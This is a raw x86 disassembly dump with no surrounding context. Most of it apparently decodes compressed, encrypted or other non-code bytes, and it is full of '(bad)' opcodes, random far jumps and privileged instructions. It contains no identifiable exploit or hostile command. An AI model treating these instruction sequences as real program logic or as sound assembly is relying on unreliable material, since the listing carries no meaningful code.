  413f0a:	popa   
  413f0b:	push   edi
  413f0c:	push   esi
  413f0d:	push   esp
  413f0e:	dec    eax
  413f0f:	je     0x413f5d
  413f11:	push   ebx
  413f12:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413f16:	push   esp
  413f17:	arpl   WORD PTR [ecx+0x4b],cx
  413f1a:	inc    edi
  413f1b:	jne    0x413f63
  413f1d:	push   ebx
  413f1e:	outs   dx,DWORD PTR ds:[esi]
  413f1f:	push   ebx
  413f20:	inc    esi
  413f21:	inc    edi
  413f22:	push   0x66495949
  413f27:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413f2b:	push   esi
  413f2c:	jb     0x413f96
  413f2e:	add    BYTE PTR [eax],al
  413f30:	js     0x413fa6
  413f32:	popa   
  413f33:	inc    ebx
  413f34:	push   ecx
  413f35:	ins    BYTE PTR es:[edi],dx
  413f36:	pop    eax
  413f37:	ja     0x413f86
  413f39:	je     0x413fb1
  413f3b:	add    BYTE PTR [ebp+0x7a],dl
  413f3e:	ins    BYTE PTR es:[edi],dx
  413f3f:	jb     0x413fba
  413f41:	inc    edi
  413f42:	push   edi
  413f43:	push   esi
  413f44:	inc    edi
  413f45:	ins    BYTE PTR es:[edi],dx
  413f46:	add    BYTE PTR [eax],al
  413f48:	jbe    0x413f8e
  413f4a:	push   esi
  413f4b:	push   edi
  413f4c:	dec    edx
  413f4d:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413f54:	add    BYTE PTR [eax],al
  413f56:	in     al,0xf5
  413f58:	jnp    0x413fa8
  413f5a:	jnp    0x413f2a
  413f5c:	cmc    
  413f5d:	call   FWORD PTR [ebx+0x61]
  413f60:	and    bh,dl
  413f62:	push   cs
  413f63:	lods   al,BYTE PTR ds:[esi]
  413f64:	fiadd  WORD PTR [eax+0xd767]
  413f6a:	inc    DWORD PTR [eax]
  413f6c:	add    BYTE PTR [eax],al
  413f6e:	or     BYTE PTR [ebx+0x1a85b21c],dh
  413f74:	fsub   DWORD PTR fs:[edx+0x75]
  413f78:	les    edi,FWORD PTR [esi-0x318b7751]
  413f7e:	push   ds
  413f7f:	mov    esi,0x872f1e9b
  413f84:	test   DWORD PTR [esi+eax*2],esp
  413f87:	fcmove st,st(1)
  413f89:	pushf  
  413f8a:	pop    eax
  413f8b:	xor    ebp,edi
  413f8d:	ins    WORD PTR es:[edi],dx
  413f8f:	inc    esi
  413f90:	and    BYTE PTR [edi-0x679a5e18],0x4c
  413f97:	inc    esi
  413f98:	es inc eax
  413f9a:	call   0x6037341c
  413f9f:	dec    ebp
  413fa0:	jmp    0x5e30aa02
  413fa5:	test   eax,0x38ef1a88
  413faa:	pop    ebp
  413fab:	stc    
  413fac:	test   eax,0xc203b66e
  413fb1:	cmp    DWORD PTR [ebx],0x77df9a86
  413fb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fb8:	adc    bl,BYTE PTR [edi]
  413fba:	dec    eax
  413fbb:	push   eax
  413fbc:	dec    ecx
  413fbd:	adc    eax,0x564af9c9
  413fc2:	out    0x9b,al
  413fc4:	retf   
  413fc5:	mov    ds:0x71139948,al
  413fca:	pusha  
  413fcb:	arpl   WORD PTR [edx+ebx*1+0x23],cx
  413fcf:	and    al,ch
  413fd1:	leave  
  413fd2:	xchg   esi,eax
  413fd3:	cs fwait
  413fd5:	push   0x59029705
  413fda:	mov    ebp,0x1630618a
  413fdf:	inc    edx
  413fe0:	mov    eax,ds:0xd077dc95
  413fe5:	arpl   WORD PTR [ebp+0x39],bp
  413fe8:	(bad)  
  413fe9:	xlat   BYTE PTR ds:[ebx]
  413fea:	les    edx,FWORD PTR [eax+0x40f8a0a4]
  413ff0:	and    BYTE PTR [eax],0x30
  413ff3:	cmc    
  413ff4:	and    esi,DWORD PTR [edx-0x32]
  413ff7:	loopne 0x414077
  413ff9:	lea    ebp,[ebx-0x6b]
  413ffc:	mov    esi,0xba629608
  414001:	leave  
  414002:	jp     0x414003
  414004:	or     edi,DWORD PTR [ecx+0x1f]
  414007:	jl     0x414018
  414009:	push   0x4a
  41400b:	pop    ss
  41400c:	je     0x413fee
  41400e:	sbb    DWORD PTR [edx],ebp
  414010:	scas   al,BYTE PTR es:[edi]
  414011:	sub    al,0x2f
  414013:	dec    ebp
  414014:	adc    DWORD PTR [ecx],ebp
  414016:	pop    ss
  414017:	mul    BYTE PTR [esi]
  414019:	inc    ebx
  41401a:	fdivr  QWORD PTR [ecx-0xa]
  41401d:	ficom  DWORD PTR [edx]
  41401f:	or     al,0x7
  414021:	or     ah,al
  414023:	xchg   esi,eax
  414024:	sbb    eax,0x2f08f856
  414029:	inc    ebp
  41402a:	inc    edx
  41402b:	mov    esi,0xed1feb15
  414030:	xor    al,BYTE PTR [ecx]
  414032:	shl    BYTE PTR [ecx+edi*1-0x3e],cl
  414036:	sbb    al,BYTE PTR [esi+eiz*4]
  414039:	xchg   edx,eax
  41403a:	pop    ebx
  41403b:	dec    edi
  41403c:	nop
  41403d:	lea    esp,[esi]
  41403f:	pushf  
  414040:	push   esp
  414041:	lea    ebp,[esi+0xf]
  414044:	and    DWORD PTR [ebx+0x6ce4ec66],edx
  41404a:	popf   
  41404b:	arpl   WORD PTR [ebp-0x4a425909],sp
  414051:	jns    0x41409f
  414053:	loope  0x41406b
  414055:	fisubr WORD PTR [edx+ebp*2+0x4d]
  414059:	pop    edx
  41405a:	jl     0x41400b
  41405c:	inc    esi
  41405d:	rcr    BYTE PTR [ecx-0x65156fc9],0xc
  414064:	xchg   esi,eax
  414065:	adc    ecx,ebp
  414067:	add    BYTE PTR [edx+0x2f],dh
  41406a:	stos   DWORD PTR es:[edi],eax
  41406b:	fld    DWORD PTR es:[eax]
	...
  4140d6:	pop    edx
  4140d7:	ficom  DWORD PTR [esi+0x60]
  4140da:	(bad)  
  4140db:	in     al,dx
  4140dc:	jle    0x4140d8
  4140de:	call   0xaca9:0xd5d52e96
  4140e5:	dec    ecx
  4140e6:	data16 fadd DWORD PTR [eax]
  4140e9:	add    bh,bh
  4140eb:	add    BYTE PTR [eax],al
  4140ed:	add    BYTE PTR [eax+0x655946d7],bh
  4140f3:	cmp    BYTE PTR [edi],dl
  4140f5:	mov    al,0xa6
  4140f7:	dec    esi
  4140f8:	fwait
  4140f9:	sub    ecx,DWORD PTR [eax-0x832df58]
  4140ff:	jae    0x4140e2
  414101:	mov    ecx,0x849a3d8d
  414106:	push   ss
  414107:	mov    dl,0x37
  414109:	mov    ebp,0xa1177493
  41410e:	and    DWORD PTR [esi-0x43],edx
  414111:	push   0xffffffa3
  414113:	scas   al,BYTE PTR es:[edi]
  414114:	push   0x799302ca
  414119:	xchg   ebp,eax
  41411a:	or     BYTE PTR [ebx+eax*1+0x2ab9a23d],dh
  414121:	xchg   edx,eax
  414122:	icebp  
  414123:	shl    BYTE PTR [edi],1
  414125:	mov    fs,edx
  414127:	outs   dx,BYTE PTR ds:[esi]
  414128:	or     al,0xb6
  41412a:	das    
  41412b:	fwait
  41412c:	inc    eax
  41412d:	jl     0x41415b
  41412f:	aaa    
  414130:	lahf   
  414131:	(bad)  
  414132:	push   edi
  414133:	loop   0x4140f6
  414135:	gs sbb edi,edi
  414138:	shl    ecx,1
  41413a:	sub    eax,0x8e63c5ff
  41413f:	dec    ecx
  414140:	push   esi
  414141:	cmp    BYTE PTR [ebp+0x1c],al
  414144:	iret   
  414145:	test   al,0x24
  414147:	imul   esi,eax,0xfffffff9
  41414a:	add    DWORD PTR gs:[ebx+0x67],0xa755c208
  414152:	scas   eax,DWORD PTR es:[edi]
  414153:	push   eax
  414154:	pop    edx
  414155:	jmp    0xafc3dd57
  41415a:	shr    BYTE PTR [ebp-0x3e],0x7c
  41415e:	sbb    BYTE PTR [ebp-0x64490404],bh
  414164:	xor    BYTE PTR [ebx+0x44],ah
  414167:	(bad)  
  414168:	push   0x90bfceeb
  41416d:	sbb    DWORD PTR [ecx+0x7c],ecx
  414170:	cs push es
  414172:	sub    al,ah
  414174:	xchg   DWORD PTR [eax+0x3f],esi
  414177:	cmc    
  414178:	gs lahf 
  41417a:	inc    BYTE PTR ds:0x76462b0e
  414180:	xchg   BYTE PTR [edi+0x11],ah
  414183:	adc    bh,ah
  414185:	sbb    eax,0xe9c0ee7e
  41418a:	ss jmp 0xc79b:0x86dc2af4
  414192:	sbb    BYTE PTR [ebp-0x238a8be9],0x60
  414199:	mov    ecx,0x19dd572a
  41419e:	(bad)  
  41419f:	nop
  4141a0:	out    0x53,eax
  4141a2:	xchg   DWORD PTR fs:[eax],esi
  4141a5:	loope  0x4141f1
  4141a7:	push   ss
  4141a8:	or     ch,ah
  4141aa:	imul   esp,DWORD PTR [esp+eax*2+0x1893a733],0x497c1da4
  4141b5:	or     edi,DWORD PTR [esi]
  4141b7:	pop    esp
  4141b8:	add    esi,DWORD PTR [eax+edi*4+0x2cb7c654]
  4141bf:	dec    edi
  4141c0:	push   ebp
  4141c1:	xchg   ecx,eax
  4141c2:	inc    eax
  4141c3:	in     eax,0x13
  4141c5:	aas    
  4141c6:	call   0xf123:0xb7ee7dcf
  4141cd:	dec    eax
  4141ce:	mov    ds:0xc6e62143,al
  4141d3:	ins    DWORD PTR es:[edi],dx
  4141d4:	in     eax,0x9c
  4141d6:	xchg   DWORD PTR [edi+0x7d],eax
  4141d9:	inc    ebx
  4141da:	lahf   
  4141db:	call   0xb77a4b2b
  4141e0:	mov    dh,0x23
  4141e2:	mov    bh,0x53
  4141e4:	loope  0x4141da
  4141e6:	sub    al,0x5e
  4141e8:	(bad)  
  4141e9:	scas   al,BYTE PTR es:[edi]
  4141ea:	mov    ebp,ecx
  4141ec:	mov    eax,ds:0x0
	...
  414255:	add    BYTE PTR [edx],al
  414257:	adc    al,BYTE PTR [ecx]
  414259:	mov    ds:0xb3a2b311,eax
  41425e:	mov    DWORD PTR [ecx+0x37],edx
  414261:	push   edi
  414262:	mov    ebx,0x655bb2ed
  414267:	fld    DWORD PTR [eax]
  414269:	add    bh,bh
  41426b:	add    BYTE PTR [eax],al
  41426d:	add    BYTE PTR [edx+0x23],dl
  414270:	dec    esp
  414271:	ja     0x4142af
  414273:	ins    BYTE PTR es:[edi],dx
  414274:	xchg   ebx,edx
  414276:	sbb    ebx,edx
  414278:	sar    BYTE PTR [edx-0x6d],0xc7
  41427c:	cmp    al,0xb8
  41427e:	sub    BYTE PTR [eax],cl
  414280:	test   al,0x35
  414282:	push   ecx
  414283:	mov    WORD PTR [edi+0xbb75be1],gs
  414289:	dec    BYTE PTR [edi-0x26f4dd26]
  41428f:	out    dx,eax
  414290:	mov    ch,0xc0
  414292:	popa   
  414293:	dec    ecx
  414294:	push   esp
  414295:	mov    edi,0x45b12d0
  41429a:	sbb    DWORD PTR [edx+0x7d],esi
  41429d:	jbe    0x4142ef
  41429f:	outs   dx,BYTE PTR ds:[esi]
  4142a0:	adc    bh,bl
  4142a2:	int    0x7
  4142a4:	jmp    0x90a8:0x234fff4f
  4142ab:	add    eax,0xd5af6c58
  4142b0:	mov    ch,0xce
  4142b2:	push   ecx
  4142b3:	push   ss
  4142b4:	psubd  mm4,mm2
  4142b7:	daa    
  4142b8:	fild   DWORD PTR [esp+ecx*2+0x29]
  4142bc:	inc    ebp
  4142bd:	repz jno 0x414287
  4142c0:	cmp    DWORD PTR ds:0x3b8a559a,ecx
  4142c6:	(bad)  
  4142c7:	and    eax,0x5edb158a
  4142cc:	pop    ds
  4142cd:	leave  
  4142ce:	fimul  DWORD PTR [ebp-0x10]
  4142d1:	ins    DWORD PTR es:[edi],dx
  4142d2:	sub    eax,0x7b23782f
  4142d7:	ret    
  4142d8:	mov    edi,0x89ed9006
  4142dd:	mov    al,ds:0xe3adabc0
  4142e2:	rcl    DWORD PTR [esp+ebp*4-0x1ed79bdc],1
  4142e9:	mov    ecx,0xab8dbe6d
  4142ee:	rcl    BYTE PTR [esi],1
  4142f0:	jne    0x41436d
  4142f2:	lea    edi,ds:0x140086e4
  4142f8:	(bad)  
  4142f9:	cwde   
  4142fa:	pusha  
  4142fb:	cmp    DWORD PTR [esi+0x1433ecb1],ebp
  414301:	sub    DWORD PTR [bp+si-0x60],0xffffffc1
  414306:	mov    esi,0x8ee115de
  41430b:	mov    bl,0x17
  41430d:	pushf  
  41430e:	push   es
  41430f:	mov    WORD PTR [edi+0x66],ss
  414312:	sub    dl,BYTE PTR [esi+0x7a]
  414315:	or     ch,ah
  414317:	xchg   esp,eax
  414318:	dec    edi
  414319:	mov    WORD PTR [esp+eax*4-0x54],cs
  41431d:	xor    ebp,DWORD PTR [ecx]
  41431f:	test   BYTE PTR [edx-0x28142083],dh
  414325:	push   ebp
  414326:	jecxz  0x4142a9
  414328:	pusha  
  414329:	mov    ah,0x11
  41432b:	push   ecx
  41432c:	fsubr  QWORD PTR [edi]
  41432e:	cli    
  41432f:	fisubr WORD PTR [esi]
  414331:	jl     0x41430e
  414333:	jae    0x414319
  414335:	sbb    edi,eax
  414337:	inc    ecx
  414338:	cmp    bh,BYTE PTR [eax]
  41433a:	add    al,0x3d
  41433c:	cld    
  41433d:	push   0x48c3ea4e
  414342:	(bad)  
  414343:	push   esi
  414344:	push   esi
  414345:	and    esi,DWORD PTR [eax]
  414347:	call   0xeda3c6dc
  41434c:	outs   dx,DWORD PTR ds:[esi]
  41434d:	mov    ds:0x2bd2b82b,eax
  414352:	sbb    bh,bl
  414354:	and    BYTE PTR [esi+0x5b3c731d],ah
  41435a:	push   esp
  41435b:	ins    BYTE PTR es:[edi],dx
  41435c:	cmp    BYTE PTR [ebp-0x3e],bl
  41435f:	or     bl,BYTE PTR [ebp+0x17923b0c]
  414365:	mov    esp,0x20cd092d
  41436a:	sbb    DWORD PTR [eax-0x6],0x0
	...
  4143d5:	add    BYTE PTR [ecx],al
  4143d7:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  4143de:	rol    DWORD PTR [ebp+0x5e],0xa1
  4143e2:	sub    eax,0x642d914a
  4143e7:	fiadd  DWORD PTR [eax]
  4143e9:	add    bh,bh
  4143eb:	add    BYTE PTR [eax],al
  4143ed:	add    BYTE PTR [esi-0x2a71b97e],al
  4143f3:	mov    ah,0x27
  4143f5:	add    al,0xf2
  4143f7:	bound  eax,QWORD PTR [eax]
  4143f9:	ret    0x2374
  4143fc:	dec    esi
  4143fd:	inc    ebx
  4143fe:	dec    esp
  4143ff:	add    al,0xdf
  414401:	adc    edx,esp
  414403:	shr    BYTE PTR [ebx+0x49b58b98],cl
  414409:	scas   eax,DWORD PTR es:[edi]
  41440a:	in     al,0x2a
  41440c:	pop    es
  41440d:	mov    ecx,0x9ff45fb1
  414412:	in     al,dx
  414413:	add    eax,0xd8727b98
  414418:	and    esi,ebx
  41441a:	mov    DWORD PTR [ebp-0x68],ebx
  41441d:	test   DWORD PTR [ebp-0x57],0xed49b0eb
  414424:	dec    eax
  414425:	jae    0x414404
  414427:	pop    eax
  414428:	aad    0x98
  41442a:	(bad)  
  41442b:	mov    ebx,0x82e4e2cd
  414430:	push   ecx
  414431:	mov    dl,0xc7
  414433:	xchg   ecx,eax
  414434:	mov    WORD PTR [ebp+0x34bc6583],gs
  41443a:	leave  
  41443b:	and    eax,DWORD PTR [esi-0x7c]
  41443e:	into   
  41443f:	clc    
  414440:	mov    esp,0x2c3f5dff
  414445:	jmp    0x4b9d:0x5d9342fd
  41444c:	addr16 inc ebp
  41444e:	loopne 0x41448c
  414450:	xor    al,al
  414452:	sub    DWORD PTR [esi-0x13],ebp
  414455:	loopne 0x414447
  414457:	scas   eax,DWORD PTR es:[edi]
  414458:	adc    BYTE PTR [edi+esi*4-0x6c],cl
  41445c:	xchg   esi,eax
  41445d:	pop    ss
  41445e:	in     al,dx
  41445f:	aaa    
  414460:	jg     0x4144a0
  414462:	xor    BYTE PTR [edx],dh
  414464:	push   ecx
  414465:	gs xor edx,ebx
  414468:	mov    eax,0x18f9778e
  41446d:	dec    ebp
  41446e:	sub    ebp,DWORD PTR [esi-0x10]
  414471:	test   DWORD PTR ds:0x62b1152c,eax
  414477:	ds nop
  414479:	imul   edi,DWORD PTR [eax-0x78f352f6],0xb8aee0df
  414483:	xchg   ebx,eax
  414484:	or     si,WORD PTR [eax+0x64fd626e]
  41448b:	pop    ds
  41448c:	pop    ecx
  41448d:	push   edi
  41448e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41448f:	jp     0x41447a
  414491:	stos   BYTE PTR es:[edi],al
  414492:	repz cmp eax,0x66e7df5f
  414498:	dec    eax
  414499:	sbb    al,0x50
  41449b:	ins    DWORD PTR es:[edi],dx
  41449c:	push   ecx
  41449d:	adc    al,0x95
  41449f:	xor    eax,0x52f12a9
  4144a4:	or     BYTE PTR [esi+esi*1+0x30],0x82
  4144a9:	xor    bh,ch
  4144ab:	cmp    BYTE PTR [edx],dl
  4144ad:	pop    edi
  4144ae:	cs mov ch,0xd
  4144b1:	inc    esp
  4144b2:	daa    
  4144b3:	mov    es,WORD PTR [eax]
  4144b5:	sub    bl,BYTE PTR [ecx-0x62]
  4144b8:	es pop esp
  4144ba:	lahf   
  4144bb:	and    BYTE PTR [esi+0x7f60ff91],ah
  4144c1:	inc    ebx
  4144c2:	mov    ecx,ebx
  4144c4:	or     bh,BYTE PTR [ebp+0x4e]
  4144c7:	add    BYTE PTR [eiz*8+0x7cf2fbcc],0x67
  4144cf:	mov    ecx,0xefa5c322
  4144d4:	mov    bl,0x9
  4144d6:	sbb    ch,BYTE PTR [eax]
  4144d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144d9:	dec    edi
  4144da:	xor    BYTE PTR [edi+0xeae331a],bl
  4144e0:	push   0x5864811e
  4144e5:	push   edx
  4144e6:	and    al,0x80
  4144e8:	or     DWORD PTR [ecx+0xf599a7],edx
	...
  414556:	pop    ebx
  414557:	jae    0x41459b
  414559:	or     eax,0x775f3d6a
  41455e:	pop    ds
  41455f:	dec    edi
  414560:	or     cl,BYTE PTR [esi+0x4]
  414563:	in     eax,0xbd
  414565:	mov    al,0x63
  414567:	fild   DWORD PTR [eax]
  414569:	add    bh,bh
  41456b:	add    BYTE PTR [eax],al
  41456d:	add    BYTE PTR [ebp-0x39d05f35],ah
  414573:	jnp    0x41457e
  414575:	cdq    
  414576:	jmp    0xcc4d:0x52aa93a4
  41457d:	das    
  41457e:	ret    
  41457f:	xchg   edi,eax
  414580:	and    al,0xfe
  414582:	sbb    al,0x3c
  414584:	inc    esp
  414585:	imul   BYTE PTR cs:[ebx]
  414588:	int3   
  414589:	or     esp,DWORD PTR [eax]
  41458b:	ret    
  41458c:	je     0x4145dd
  41458e:	xchg   ebx,eax
  41458f:	hlt    
  414590:	retf   0x5bd5
  414593:	ins    BYTE PTR es:[edi],dx
  414594:	add    al,0x90
  414596:	clc    
  414597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414598:	adc    eax,0x2f555be0
  41459d:	inc    esp
  41459e:	mov    dl,0x9d
  4145a0:	inc    ebp
  4145a1:	xor    dh,BYTE PTR [edi]
  4145a3:	std    
  4145a4:	xor    bl,BYTE PTR [bx-0xc66]
  4145a9:	shl    BYTE PTR [ebp-0x67],0x8d
  4145ad:	imul   ebx,DWORD PTR [edi+0x1],0x2bf6f3fe
  4145b4:	xor    DWORD PTR [ebp+0x5e],eax
  4145b7:	and    eax,0x4ae7104
  4145bc:	xchg   BYTE PTR [eax-0x69cf017a],ah
  4145c2:	cmp    eax,0x32b336bb
  4145c7:	adc    eax,0xdd10ee93
  4145cc:	inc    eax
  4145cd:	dec    esp
  4145ce:	pop    ds
  4145cf:	popf   
  4145d0:	test   eax,0x55a34017
  4145d5:	dec    ecx
  4145d6:	or     edx,esp
  4145d8:	fsubr  st(7),st
  4145da:	in     eax,dx
  4145db:	dec    eax
  4145dc:	mov    bl,0xa1
  4145de:	mov    cl,BYTE PTR [edi-0x1219b75c]
  4145e4:	gs dec edi
  4145e6:	test   BYTE PTR [eax-0x25a523b5],dh
  4145ec:	jmp    0x414575
  4145ee:	imul   ecx,DWORD PTR [ebx+0x5d],0x36a77a40
  4145f5:	aaa    
  4145f6:	enter  0xab24,0x48
  4145fa:	pushf  
  4145fb:	inc    edx
  4145fc:	mov    BYTE PTR [ebx],ah
  4145fe:	cmp    edi,ebx
  414600:	out    dx,al
  414601:	or     bl,dh
  414603:	into   
  414604:	je     0x41459a
  414606:	sbb    DWORD PTR [ecx-0x69],ecx
  414609:	mov    ?,eax
  41460b:	sub    edi,ecx
  41460d:	cdq    
  41460e:	fadd   st,st(6)
  414610:	jl     0x4145e8
  414612:	xor    eax,0x93e6f3c4
  414617:	les    ecx,FWORD PTR ds:0xcb473357
  41461d:	(bad)  
  41461e:	ins    BYTE PTR es:[edi],dx
  41461f:	and    DWORD PTR [esi-0x5ca56797],ecx
  414625:	(bad)  
  414626:	arpl   WORD PTR [esi-0xc3a47a8],dx
  41462c:	or     al,BYTE PTR [edi]
  41462e:	dec    esi
  41462f:	mov    bl,0x63
  414631:	addr16 (bad) 
  414633:	imul   edx,DWORD PTR [ebp+ebx*4+0x31c30e11],0x6
  41463b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41463c:	mov    ah,BYTE PTR [edi+0x46f37192]
  414642:	xchg   edx,eax
  414643:	hlt    
  414644:	mov    cl,0x15
  414646:	and    eax,0xf559f2ed
  41464b:	sbb    al,0x70
  41464d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41464e:	mov    dl,0xab
  414650:	push   edx
  414651:	sti    
  414652:	jno    0x4145e5
  414654:	and    DWORD PTR [edi],ecx
  414656:	cmp    dh,BYTE PTR [ebx-0x2e]
  414659:	jle    0x4146c6
  41465b:	mov    dl,0x91
  41465d:	inc    ecx
  41465e:	pop    ebx
  41465f:	mov    edi,0xb7aca3ee
  414664:	sub    eax,0x1bfd6d4b
  414669:	dec    ebx
  41466a:	add    al,0x54
  41466c:	add    BYTE PTR ss:[eax],al
	...
  4146d3:	add    BYTE PTR [eax],al
  4146d5:	add    BYTE PTR [edi+0x5e],bh
  4146d8:	cmc    
  4146d9:	ins    DWORD PTR es:[edi],dx
  4146da:	cmc    
  4146db:	out    dx,eax
  4146dc:	call   FWORD PTR [esi+0x17]
  4146df:	enter  0xab7a,0x6c
  4146e3:	cmp    eax,0xdc6292ec
  4146e8:	add    BYTE PTR [eax],al
  4146ea:	inc    DWORD PTR [eax]
  4146ec:	add    BYTE PTR [eax],al
  4146ee:	je     0x4146c4
  4146f0:	xchg   ebx,eax
  4146f1:	out    dx,al
  4146f2:	push   ebp
  4146f3:	push   ecx
  4146f4:	int3   
  4146f5:	leave  
  4146f6:	sub    esi,DWORD PTR [esi]
  4146f8:	popf   
  4146f9:	rcl    dh,cl
  4146fb:	jne    0x414709
  4146fd:	cwde   
  4146fe:	mov    esp,0x703a2dd3
  414703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414704:	into   
  414705:	(bad)  
  414706:	std    
  414707:	inc    al
  414709:	(bad)  
  41470a:	cwde   
  41470b:	jno    0x41472f
  41470d:	sbb    BYTE PTR [esi],bh
  41470f:	test   al,0x9b
  414711:	dec    esp
  414712:	jge    0x41478f
  414714:	ds mov bl,0x1
  414717:	jne    0x4146c7
  414719:	add    BYTE PTR [eax-0x40726e31],ah
  41471f:	shl    BYTE PTR [ebx+esi*2],cl
  414722:	mov    ebp,0x69c1421d
  414727:	rcr    DWORD PTR [ebp+0x268cc4bf],cl
  41472d:	ins    DWORD PTR es:[edi],dx
  41472e:	or     al,0x25
  414730:	dec    esp
  414731:	in     al,dx
  414732:	shl    bh,0xa9
  414735:	and    edx,DWORD PTR [eax+0x2e23ff7e]
  41473b:	mov    edi,DWORD PTR [edx-0x6c97ad62]
  414741:	pop    ss
  414742:	push   edi
  414743:	retf   
  414744:	push   0xfffffff2
  414746:	stc    
  414747:	retf   0xf30
  41474a:	push   cs
  41474b:	sar    bh,0xf4
  41474e:	popa   
  41474f:	retf   0x4dc4
  414752:	jmp    0xbc6:0x8425bf9f
  414759:	js     0x4147d9
  41475b:	pop    edi
  41475c:	sub    esi,ebx
  41475e:	iret   
  41475f:	mov    cl,0xb9
  414761:	in     eax,0x75
  414763:	push   0x2d3a94de
  414768:	and    DWORD PTR ds:[ebx],ebx
  41476b:	mov    ds:0x4cd3418e,al
  414770:	cwde   
  414771:	dec    eax
  414772:	test   eax,0x9914ed19
  414777:	retf   
  414778:	jl     0x4147e1
  41477a:	or     al,0x3b
  41477c:	sar    DWORD PTR [eax],0x91
  41477f:	dec    ebp
  414780:	dec    ebx
  414781:	xor    DWORD PTR [ebx+edx*1],ecx
  414784:	rcl    ch,1
  414786:	in     eax,0x2d
  414788:	fmul   QWORD PTR [ecx]
  41478a:	adc    DWORD PTR [ebp-0x6a6a12ab],ebp
  414790:	test   eax,0xd9b6dbfb
  414795:	call   0x590f88ce
  41479a:	(bad)  
  41479b:	out    0x8c,al
  41479d:	adc    eax,0x66ef7c3a
  4147a2:	es stc 
  4147a4:	jmp    0x4782:0xd2becdba
  4147ab:	call   0xdb07:0x428b92ca
  4147b2:	pushf  
  4147b3:	(bad)  
  4147b4:	iret   
  4147b5:	sub    al,0xa2
  4147b7:	and    eax,eax
  4147b9:	or     eax,0x2974b5a
  4147be:	xchg   ebx,eax
  4147bf:	arpl   WORD PTR [ecx+eax*8-0x6da91ae6],dx
  4147c6:	mov    ds:0x73194426,eax
  4147cb:	inc    BYTE PTR [ecx]
  4147cd:	addr16 (bad) 
  4147cf:	enter  0xd6dc,0x2a
  4147d3:	sub    DWORD PTR es:[edx],edi
  4147d6:	lea    edx,[edi]
  4147d8:	in     eax,0xcd
  4147da:	cmp    bl,BYTE PTR [eax+0x1bf72bcf]
  4147e0:	jl     0x414845
  4147e2:	cmp    dh,BYTE PTR [eax-0x41c03e04]
  4147e8:	cmp    ecx,DWORD PTR [ecx]
  4147ea:	sub    BYTE PTR [ecx],0x36
	...
  414855:	add    BYTE PTR [esi+0x2f],bh
  414858:	add    DWORD PTR [ebp+0x51],ebp
  41485b:	outs   dx,DWORD PTR ds:[esi]
  41485c:	jle    0x41489d
  41485e:	aas    
  41485f:	mov    BYTE PTR [esi],cl
  414861:	cmp    eax,0x7707a71e
  414866:	popa   
  414867:	fld    QWORD PTR [eax]
  414869:	add    bh,bh
  41486b:	add    BYTE PTR [eax],al
  41486d:	add    BYTE PTR [ebx],dh
  41486f:	ss push ebp
  414871:	add    eax,0xe195091e
  414876:	out    dx,al
  414877:	lock xor eax,0xe8efa316
  41487d:	enter  0x7dcc,0x43
  414881:	and    ch,ch
  414883:	into   
  414884:	retf   0xbfa8
  414887:	jp     0x41481c
  414889:	retf   0x7441
  41488c:	ja     0x4148ff
  41488e:	daa    
  41488f:	cdq    
  414890:	ds out dx,eax
  414892:	or     al,BYTE PTR [edx-0x63e4ad8b]
  414898:	sub    eax,0xbbf6b813
  41489d:	inc    eax
  41489e:	sub    BYTE PTR [esp+edi*1+0x3c],dh
  4148a2:	cmp    bh,BYTE PTR [esi-0x3d]
  4148a5:	pushf  
  4148a6:	add    BYTE PTR [esi+0x3d],0x9a
  4148aa:	clc    
  4148ab:	push   edi
  4148ac:	add    cl,ch
  4148ae:	loope  0x4148ea
  4148b0:	lock mov al,0xf9
  4148b3:	loopne 0x414837
  4148b5:	mov    esp,DWORD PTR [eax+0x563a9556]
  4148bb:	jns    0x4148ff
  4148bd:	lahf   
  4148be:	jns    0x4148a7
  4148c0:	jmp    0x5ddf8d1d
  4148c5:	add    al,0x7a
  4148c7:	nop
  4148c8:	iret   
  4148c9:	push   edi
  4148ca:	cld    
  4148cb:	and    eax,0xee116a1d
  4148d0:	and    BYTE PTR [eax],dl
  4148d2:	retf   
  4148d3:	rol    ebp,1
  4148d5:	ret    0x5164
  4148d8:	lock mov ecx,0xda8a0e36
  4148de:	dec    esi
  4148df:	mov    al,ds:0x2118b43d
  4148e4:	push   eax
  4148e5:	es push edi
  4148e7:	aam    0x9d
  4148e9:	jo     0x414926
  4148eb:	ret    
  4148ec:	gs jl  0x414968
  4148ef:	pop    esp
  4148f1:	test   al,0x4c
  4148f3:	loop   0x414918
  4148f5:	pop    ecx
  4148f6:	mov    ah,ah
  4148f8:	mov    bh,0xfc
  4148fa:	push   edi
  4148fb:	jnp    0x41487e
  4148fd:	imul   ecx,DWORD PTR [edi],0x821e06ca
  414903:	shr    DWORD PTR [edx],1
  414905:	lods   al,BYTE PTR ds:[esi]
  414906:	test   eax,0x25b80077
  41490b:	or     BYTE PTR [ebx+0x67],dl
  41490e:	xchg   ecx,eax
  41490f:	inc    ebx
  414910:	(bad)  
  414911:	xchg   edi,eax
  414912:	enter  0x5178,0x9
  414916:	jp     0x4148e1
  414918:	(bad)  
  414919:	xor    BYTE PTR [esi-0x53],dh
  41491c:	sbb    eax,0x4847ae64
  414921:	call   0xcdc4:0xd2b2e4ee
  414928:	loope  0x4148ab
  41492a:	test   al,0xb7
  41492c:	test   DWORD PTR [eax],ebx
  41492e:	mov    ecx,0xe725944d
  414933:	repz pop eax
  414935:	mov    edx,ebx
  414937:	adc    eax,0x5e66c95
  41493c:	jl     0x414908
  41493e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41493f:	repz sti 
  414941:	fcom   DWORD PTR [eax]
  414943:	sub    ebp,DWORD PTR [eax-0x71af2272]
  414949:	mov    dh,0xce
  41494b:	retf   
  41494c:	aam    0xf1
  41494e:	pop    esp
  41494f:	adc    esi,DWORD PTR [esi+0x57]
  414952:	hlt    
  414953:	fs mov dh,0xf3
  414956:	mov    ch,0x1f
  414958:	int3   
  414959:	addr16 jp 0x414922
  41495c:	jmp    0xf10c:0x91d02ba2
